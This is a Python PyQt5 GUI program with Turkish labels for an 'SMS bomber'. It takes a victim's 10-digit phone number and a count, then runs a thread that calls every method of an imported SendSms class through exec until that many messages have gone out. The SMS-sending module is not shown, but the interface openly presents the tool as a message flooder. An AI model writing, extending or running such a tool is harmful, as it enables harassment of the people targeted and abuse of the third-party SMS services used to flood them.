from PyQt5.QtWidgets import QApplication, QMainWindow, QMessageBox
from PyQt5.QtCore import QSize
from threading import Thread
from sys import argv, exit
from interface import *
from sms import *


class uygulama(QMainWindow, Ui_MainWindow1):
    def __init__(self):
        super().__init__()
        self.setupUi(self)
        self.setFixedSize(QSize(300, 400))
        self.setStyleSheet(
            open("C:/SdBomber/style.css").read())
        self.gonder.clicked.connect(self.bomber)
        self.iptalBtn.clicked.connect(self.iptal)

    def bomber(self):
        if self.number.text() == "":
            QMessageBox.warning(self, "Hata", "Numara Giriniz")
            return
        if self.number.text().startswith("0") == True:
            QMessageBox.warning(self, "Hata", "Numaranın başına 0 koymayınız!")
            return
        if not len(self.number.text()) == 10:
            QMessageBox.warning(
                self, "Hata", "Numaranın uzunluğu 10 haneden oluşmalıdır")
            return
        if self.adet.text() == "":
            QMessageBox.warning(self, "Hata", "Adet Giriniz")
            return
        self.gonder.setText("BOMB")
        self.gonder.setEnabled(False)
        self.number.setEnabled(False)
        self.adet.setEnabled(False)
        self.gonderilenSms.show()
        self.bitisLbl.hide()
        self.th = Thread(target=self.bomberThread)
        self.th.start()

    def bomberThread(self):
        self.isClose = False
        self.sayac = 0
        sms = SendSms(str(self.number.text()), "")
        while True:
            for attribute in dir(SendSms):
                attribute_value = getattr(SendSms, attribute)
                if callable(attribute_value):
                    if attribute.startswith('__') == False:
                        exec("global x; x = sms."+attribute+"()")
                        global x
                        if x == True:
                            self.sayac += 1
                            self.update()
                if self.sayac == int(self.adet.text()) or self.isClose == True:
                    break
            if self.sayac == int(self.adet.text()) or self.isClose == True:
                break
        self.bitis()

    def bitis(self):
        self.gonder.setText("Bomber")
        self.gonder.setEnabled(True)
        self.number.setEnabled(True)
        self.adet.setEnabled(True)
        self.bitisLbl.setText("Bomber Bitti")
        self.bitisLbl.setStyleSheet("color: orange;")
        self.bitisLbl.show()

    def update(self):
        self.gonderilenSms.setText("Gonderilen Sms: "+str(self.sayac))

    def iptal(self):
        self.isClose = True
        self.bitisLbl.setText("İptal Edildi")
        self.bitisLbl.setStyleSheet("color: red;")
        self.bitisLbl.show()
        self.gonder.setEnabled(True)
        self.number.setEnabled(True)
        self.adet.setEnabled(True)


    def closeEvent(self, event):
        reply = QMessageBox.question(
            self, 'Uyarı', "Çıkmak istediğinize emin misiniz?", QMessageBox.Yes | QMessageBox.No, QMessageBox.No)
        if reply == QMessageBox.Yes:
            self.isClose = True
            if not type(event) == bool:
                event.accept()
            else:
                exit()
        else:
            if not type(event) == bool:
                event.ignore()


if __name__ == "__main__":
    app = QApplication(argv)
    uyg = uygulama()
    uyg.show()
    app.exec_()
